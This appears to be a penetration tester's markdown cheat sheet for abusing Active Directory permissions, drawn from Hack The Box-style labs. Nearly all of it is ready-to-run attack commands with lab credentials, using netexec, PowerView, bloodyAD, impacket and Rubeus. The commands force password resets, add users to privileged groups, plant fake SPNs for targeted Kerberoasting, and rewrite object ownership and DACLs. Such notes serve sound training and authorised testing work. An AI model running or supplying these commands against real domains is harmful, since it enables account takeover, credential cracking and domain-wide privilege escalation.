#### Password Reset (User-Force-Change-Password)
Linux
```bash
netexec smb 10.10.11.69 -u p.agila -p 'prometheusx-303' -M change-password -o USER=winrm_svc NEWPASS='Pwned123!'
```

Create `PSCredential` Object
```powershell
$SecPassword = ConvertTo-SecureString '$$Bond@007$$' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('trilocor\JFLEMMING', $SecPassword)
```
Create `SecureString`Object for user to abuse
```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d123!' -AsPlainText -Force
```
Change users password
```powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

OTHER
Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force ) -Verbose

```

---
#### Adding User to Group (GenericWrite)
Linux
```powershell
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "alfred" -p "basketball" add groupMember "Infrastructure" "Alfred"

net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```
Create `PSCredential` Object
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d123!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```
Add to group
```powershell
Import-Module .\PowerView.ps1
Add-DomainGroupMember -Identity "MSSP Connect" -Members "KSALINAS" -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```
Verify
```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select MemberName
```
Cleanup
```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

---
#### Targeted Kerberoast
Let's say that our client permitted us to change the password of the `damundsen` user, but the `adunn` user is an admin account that cannot be interrupted. Since we have `GenericAll` rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's [servicePrincipalName attribute](https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname) to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat

Linux
```bash
python3 ~/opt/AD/targetedKerberoast/targetedKerberoast.py -v -d "fluffy.htb" -u p.agila -p 'prometheusx-303' -U Administrator
```

Windows
```powershell
$SecPassword = ConvertTo-SecureString '$$Bond@007$$' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('trilocor\JFLEMMING', $SecPassword)
```

Create fake SPN
```powershell
Set-DomainObject -Credential $Cred -Identity KSALINAS -SET @{serviceprincipalname='notahacker/Pwned'} -Verbose
```
Kerberoast w/ Rubeus
```powershell
.\Rubeus.exe kerberoast /user:KSALINAS /nowrap
```
Cleanup
```powershell
Set-DomainObject -Credential $Cred -Identity adunn -Clear serviceprincipalname -Verbose
```

---
### WriteOwner

Linux
```bash
impacket-owneredit -action write -new-owner 'Sam' -target 'John' 'tombwatcher.htb'/'sam':'Pwned123!' -dc-ip 10.10.11.72
```

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'Sam' -target 'John' 'tombwatcher.htb'/'sam':'Pwned123!' -dc-ip 10.10.11.72
```

---
### GenericAll (OU)

Linux
```bash
impacket-dacledit -action write -rights 'FullControl' -inheritance -principal 'John' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'John':'Pwned123!' -dc-ip 10.10.11.72
```

---

### Restore User Account

Evil-Winrm
```bash
Restore-ADObject -Identity <GUID>
Enable-ADAccount -Identity cert_admin
```